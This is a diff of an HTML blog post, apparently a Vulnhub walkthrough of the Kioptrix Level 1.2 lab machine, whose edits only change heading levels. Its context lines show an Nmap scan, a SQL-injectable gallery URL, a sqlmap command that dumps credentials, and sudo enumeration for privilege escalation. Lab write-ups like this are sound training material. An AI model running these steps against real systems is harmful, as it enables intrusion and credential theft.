@@ -54,11 +54,11 @@ Contact Me
 <div class="row justify-content-center">
 <div class=col-lg-8>
 <article class=site-blog-details>
-<h2 class=blog-title>KIOPTRIX: LEVEL 1.2 Vulnhub Walkthrough</h2>
 <p><span>September 27, 2020</span> by <span>Nasef</span></p>
+<h2 class=blog-title>KIOPTRIX: LEVEL 1.2 Vulnhub Walkthrough</h2>
 <img class=feature-image src=https://iamnasef.com/images/blog/featured-image-vulnhub.png alt=blog-feature-image>
 <p>KIOPTRIX: LEVEL 1.2 is a machine in which I used SQL Injection to get useres credintials to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.</p>
-<h3 id=scanning>Scanning</h3>
+<h2 id=scanning>Scanning</h2>
 <p>As always, I started scanning with Nmap</p>
 <pre><code>root@kali:/home/kali# nmap -sV -sC -p- 192.168.198.143
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 21:03 EDT
@@ -84,15 +84,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds
 
 </code></pre><p>A Normal HTTP and SSH Services</p>
-<h3 id=http-services>HTTP Services</h3>
+<h2 id=http-services>HTTP Services</h2>
 <p>So First I tried to browse the website and found a suspicous URL. And Adding the single quotation giving me a MySQL error so it&rsquo;s vulnerable to SQL Injection.</p>
 <pre><code>http://192.168.198.143/gallery/gallery.php?id=1&amp;sort=photoid#photos
-</code></pre><h3 id=sql-injection>SQL Injection</h3>
+</code></pre><h2 id=sql-injection>SQL Injection</h2>
 <p>So Imeditatly I ran SQLMAP to exploit, dump database and evnatioly crack the hashes found in the database.</p>
 <pre><code>sqlmap -u 192.168.198.143/gallery/gallery.php?id=1 --dump
 </code></pre><p><img src=/images/blog/006/1.png alt=Username></p>
 <p>Then I ssh&rsquo;d to user loneferret.</p>
-<h3 id=privilege-escalation>Privilege Escalation</h3>
+<h2 id=privilege-escalation>Privilege Escalation</h2>
 <p>I ran diffreent Enumeration scripts and found an intersting sudo privileges.</p>
 <pre><code>loneferret@Kioptrix3:~$ sudo -l
 User loneferret may run the following commands on this host:
